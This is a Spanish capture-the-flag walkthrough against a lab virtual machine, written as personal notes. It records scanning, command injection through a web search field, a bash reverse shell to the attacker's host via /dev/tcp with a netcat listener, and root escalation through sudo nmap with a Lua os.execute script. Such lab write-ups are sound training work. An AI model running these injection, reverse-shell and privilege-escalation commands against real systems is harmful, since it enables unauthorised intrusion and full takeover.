# ToDo #



~~Machine:
	HackingStation:
	netdiscover -r 10.0.2.0/24
	nmap first
	nmap services
	Solo puerto 80, miramos la pág:
		CVE apache 2.4.57 -> CVE-2023-31122
		Dejamos ejecutando un dirb sobre el servicio, mientras examinamos a mano la web
		Primer intento de xss con <script>alert("Hacked")</script>, no nos devuelve nada pero obtenemos un archivo en php que ejecuta un comando
		Vemos el archivo php y parece ser una base de datos de exploit-db, si buscamos por ejemplo la versión de apache, nos aparecen diferentes entradas
		Dentro de las entradas, aparece un "Apache + php - remote code execution + scanner"
			https://www.exploit-db.com/exploits/29316
		Al saber que es php y no ver un tratamiento en principio de la entrada, vamos a probar a ejecutar un ls
			apache 2.4.57;exec("ls")
			Sin exito
		Vamos al dirbuster y vemos que hay una página a la que podemos acceder:
			10.0.2.6/javascript/jquery/jquery
		Seguimos probando por la parte del input, esta vez simplemente con bash
			apache 2.4.57;whoami
			Nos responde e server devolviendonos el usuario con el que se ejecuta esto "hacker". Hecho esto vamos a mandarnos una reverse shell
				nc -nlvp 443
				Ejecutamos en el botón o con un curl la reverse shell en bash:
					bash -c 'bash -i >& /dev/tcp/10.0.2.4/443 0>&1'
			Estamkos dentro, vamos a hacer una conversion de tty
				script /dev/null -c bash
				ctrl+z
				stty raw -echo;fg
				reset xterm
				export TERM=xterm
				export SHELL=bash
		Escalamos privilegios:
			id (Poca información)
			sudo -l
				Vemos que tenemos un binario "nmap" en /usr/bin/nmap el que podemos ejecutar usar con sudo
				sudo /usr/bin/nmap 127.0.0.1
				Vemos que tiene ssh activado, pero en nuestro scan no nos aparecía. Esto es debido a que estará de forma interna. El uso
				es el usual de nmap. 
				Sabemos que con nmap, podemos ejecutar scripts, vamos a intentar crear de alguna manera un script que nos devuelva una shell como root.
				Para eso buscamos y encontramos GTFO bins, dentro de ella podemos encontrar una entrada a nmap. Vemos que con una version de nmap inferior
				a la que tiene el sistema, podríamos haber iniciado una shell interactiva con: nmap --interactive. Pero nuestra version supera a las vulnerables
				En vez de usar una sh como nos indica en el GTFObins, vamos a intentar que nos devuelva una bash:
					BASH=$(mktemp)
					echo 'os.execute("/bin/bash")' > $BASH
					sudo nmap --script=$BASH
				Tenemos acceso como root. Aunque no aparezca cuando escribimos, el comando se ejecuta. Para hacerlo más comodo podemos enviarnos
				una reverse shell como root, o activar ssh y establecer por ahí una conexión (vemos como de verdad tiene ssh abierto pero solo en modo
				escucha). De todas formas en el home de root, tenemos su flag~~
